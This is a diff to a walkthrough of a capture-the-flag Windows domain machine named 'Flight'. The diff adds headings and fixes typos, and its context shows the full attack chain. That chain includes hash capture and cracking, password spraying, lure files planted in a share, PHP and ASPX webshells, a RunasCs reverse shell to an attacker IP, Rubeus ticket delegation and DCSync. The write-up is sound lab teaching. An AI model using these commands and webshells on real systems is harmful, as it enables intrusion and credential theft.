@@ -97,6 +97,8 @@ The site is for an aviation school:
 
 ![](../images/flight2.webp)
 
+### RFI
+
 The site is all placeholder text and a few page links, but nothing interesting. It’s a very common PHP structure where different pages on a site all use `index.php` with some parameter specifying what page to include. These are often vulnerable to path traversal (reading outside the current directory) and local file include (including PHP code that is executed) vulnerabilities.
 
 On a Linux box, I’d try to read `/etc/passwd`. Since this is Windows, I’ll try `C:\windows\system32\drivers\etc\hosts`, but it returns an error:
@@ -124,6 +126,8 @@ svc_apache::flight:aaaaaaaaaaaaaaaa:f9e5ab7853f77ef2f50010223f54c359:01010000000
 ```
 
 `john` will find the password used by the svc_apache account, `S@Ss!K@*t13` :
+
+## Auth as svc_apache
 
 ```bash
 ❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
@@ -153,6 +157,8 @@ V.Stevens                     2022-09-22 20:08:22 0       Secretary
 svc_apache                    2022-09-22 20:08:23 0       Service Apache web 
 O.Possum                      2022-09-22 20:08:23 0       Helpdesk 
 ```
+
+### Password Spraying
 
 I'll create a list of all the usernames to try a password spraying.
 
@@ -192,6 +198,8 @@ SMB         10.129.95.34    445    G0               [+] flight.htb\svc_apache:S@
 SMB         10.129.95.34    445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
 ```
 
+## Auth as S.moon
+
 And we got a hit: `S.Moon:S@Ss!K@*t13`. Looking for share folders we see that we have write access in `Shared` folder. With write access to an otherwise empty share named `Shared`, there are files I can drop that might entice any legit visiting user to try to authenticate to my host. [This post](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) has a list of some of the ways this can be done. [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) is a nice tool to create a bunch of these files.
 
 ```bash
@@ -208,6 +216,8 @@ SYSVOL          READ            Logon server share
 Users           READ            
 Web             READ            
 ```
+
+### Phishing
 
 I’ll use `ntml_theft.py` to create all the files.
 
@@ -255,6 +265,8 @@ With `responder` or some smbServer running, after a minute we will get a connect
 c.bum::flight.htb:aaaaaaaaaaaaaaaa:31f4405fd28b2e0c09685c0c7d169ba3:0101000000000000801b1a22d7c4da01b7cb31957bd0c2c800000000010010006e00510063006e007300510071004300030010006e00510063006e007300510071004300020010004300500066006a0043006d0056004200040010004300500066006a0043006d005600420007000800801b1a22d7c4da01060004000200000008003000300000000000000000000000003000005dc19aecb7887e12ceb2adeca0a3dd353c3e3d5e883b5dcfcc20f40a2f0782390a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320037000000000000000000
 ```
 
+## Auth as C.bum
+
 `john` will crack his hash.
 
 ```bash
@@ -287,6 +299,8 @@ Web             READ,WRITE
 	system($_GET['cmd']);
 ?>
 ```
+
+### Shell as svc_apache
 
 Upload the webshell using `smbclient`
 
@@ -350,7 +364,9 @@ development flight\C.Bum:(OI)(CI)(W)
 
 ```
 
-We can pivot to `c.bun` using `RunasCs.exe`:
+### Pivot to C.bum
+
+We can pivot to `c.bum` using `RunasCs.exe`:
 
 ```powershell
 C:\Windows\Temp> .\RunasCs.exe c.bum Tikkycoll_431012284 cmd.exe -r 10.10.14.27:443
@@ -360,6 +376,8 @@ C:\Windows\Temp> .\RunasCs.exe c.bum Tikkycoll_431012284 cmd.exe -r 10.10.14.27:
 C:\Windows\System32> whoami
 flight\c.bum
 ```
+
+## Internal web
 
 The internal web seems to be running on port 8000:
 
@@ -419,7 +437,9 @@ Connection: close
 Content-Length: 9371
 ```
 
-They also show `X-Powered-By: ASP.NET`. Typically that means that `.aspx` type pages are in use. As we have write access with `c.bum` in `C:\inetpub\development` I will try to upload a aspx webshell.
+They also show `X-Powered-By: ASP.NET`. Typically that means that `.aspx` type pages are in use. As we have write access with `c.bum` in `C:\inetpub\development` I will try to upload a asp webshell.
+
+### ASP webshell
 
 ```aspx
 <%@ Page Language="VB" Debug="true" %>
@@ -465,6 +485,8 @@ Once done, we can try to execute commands. At my `nc` listener, I get a shell 
 
 ![](../images/flight6.png)
 
+## Shell as iis apppol
+
 ```bash
 ❯ rlwrap -cAr nc -lvnp 443
 
@@ -474,6 +496,8 @@ iis apppool\defaultapppool
 
 `iis apppool\defaultapppool` is a Microsoft Virtual Account. One thing about these accounts is that when they authenticate over the network, they do so as the machine account. 
 To abuse this, I’ll just ask the machine for a ticket for the machine account over the network using `Rubeus`.
+
+### Ticket Delegation
 
 ```powershell
 PS:\> .\rubeus.exe tgtdeleg /nowrap
@@ -522,6 +546,8 @@ Now I will export the environment variable `KRB5CCNAME` to hold the ticket:
 ```
 
 Before executing `secretsdump.py` we need to fix the time, so it won't broke. 
+
+### DCSync attack
 
 ```bash
 ❯ sudo ntpdate 10.129.129.49
